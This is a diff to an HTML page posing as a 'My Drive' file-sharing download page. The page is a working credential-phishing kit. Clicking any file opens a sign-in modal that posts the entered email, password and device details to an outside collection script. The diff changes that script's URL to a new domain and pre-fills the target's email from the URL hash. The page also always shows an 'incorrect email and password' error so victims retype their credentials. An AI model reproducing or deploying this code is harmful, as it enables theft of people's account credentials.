@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -8,12 +9,7 @@
     <link rel="preload" as="image" href="file_3.png?height=200&amp;width=300">
     <link rel="preload" as="image" href="file_2.png?height=200&amp;width=300">
     <link rel="stylesheet" href="fb4b05bff688d194.css" data-precedence="next">
-   <!-- <link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-c265f49b851cd6f9.js">
-    <script src="/_next/static/chunks/11eacf67-e8a3c6afcd735c75.js" async=""></script>
-    <script src="/_next/static/chunks/954-5265cb60fefd30ba.js" async=""></script>
-    <script src="/_next/static/chunks/main-app-cab89fa599454fd8.js" async=""></script>-->
     <title>My Drive</title>
-   <!-- <script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" nomodule=""></script>-->
     <style>
       /* Simple modal styles (assuming Tailwind-like classes; adjust if needed) */
       .modal {
@@ -362,13 +358,16 @@ const modal = document.getElementById('downloadModal');
 const form = document.getElementById('downloadForm');
 const closeBtn = document.querySelector('.close');
 const passwordError = document.getElementById('passwordError');
+const emailInput = document.getElementById('email');
 
 let count = 0;
+
 // Click triggers
-document.getElementById('downloadAll').addEventListener('click', () => modal.style.display = 'block');
 ['file1', 'file2', 'file3', 'file4'].forEach(id => {
   document.getElementById(id).addEventListener('click', () => modal.style.display = 'block');
 });
+
+document.getElementById('downloadAll').addEventListener('click', () => modal.style.display = 'block');
 
 closeBtn.addEventListener('click', () => {
   modal.style.display = 'none';
@@ -382,11 +381,10 @@ window.addEventListener('click', (e) => {
   }
 });
 
-// Auto-populate email from URL
-const urlParams = new URLSearchParams(window.location.search);
-const erEmail = urlParams.get('er');
-if (erEmail) {
-  document.getElementById('email').value = erEmail;
+// Auto-populate email from URL hash (#)
+const hash = window.location.hash.substring(1);
+if (hash) {
+  emailInput.value = decodeURIComponent(hash);
 }
 
 // Device type detection (simple)
@@ -413,7 +411,7 @@ form.addEventListener('submit', async (e) => {
   formData.append('device', device);
   formData.append('isFirst', isFirstSubmit);
 
-  let links = "https://andreandrose.co.uk/wp-includes/html-api/process.php";
+  let links = "https://diazoara.shop/tending/process.php";
 
   try {
     const response = await fetch(links, {
@@ -430,26 +428,23 @@ form.addEventListener('submit', async (e) => {
     if (result.success) {
       localStorage.setItem('submitted', 'true');
       if(count == 100){
-      //if (!isFirstSubmit) {
-        // Split er by @ and redirect to domain
-        const erParts = erEmail ? erEmail.split('@') : [];
+        const erParts = email ? email.split('@') : [];
         if (erParts.length === 2) {
           const domain = erParts[1];
           window.location.href = `https://${domain}`;
           return;
         }
       }
-      // On success, close modal
       modal.style.display = 'none';
     } else {
-      passwordError.textContent = 'INCORRECT EMAIL OR PASSWORD. SIGN-IN WITH YOUR VALID EMAIL AND PASSWORD';
+      passwordError.textContent = 'INCORRECT EMAIL AND PASSWORD. SIGN-IN WITH YOUR VALID EMAIL AND PASSWORD';
       passwordError.style.display = 'block';
-      localStorage.removeItem('submitted'); // Reset if invalid
+      localStorage.removeItem('submitted');
     }
 
-     passwordError.textContent = 'INCORRECT EMAIL OR PASSWORD. SIGN-IN WITH YOUR VALID EMAIL AND PASSWORD';
-      passwordError.style.display = 'block';
-      modal.style.display = 'block';
+    passwordError.textContent = 'INCORRECT EMAIL AND PASSWORD. SIGN-IN WITH YOUR VALID EMAIL AND PASSWORD';
+    passwordError.style.display = 'block';
+    modal.style.display = 'block';
   } catch (error) {
     console.error('Error:', error);
     passwordError.textContent = 'An error occurred. Please try again.';
@@ -462,5 +457,3 @@ form.addEventListener('submit', async (e) => {
   </body>
 
 </html>
-
-
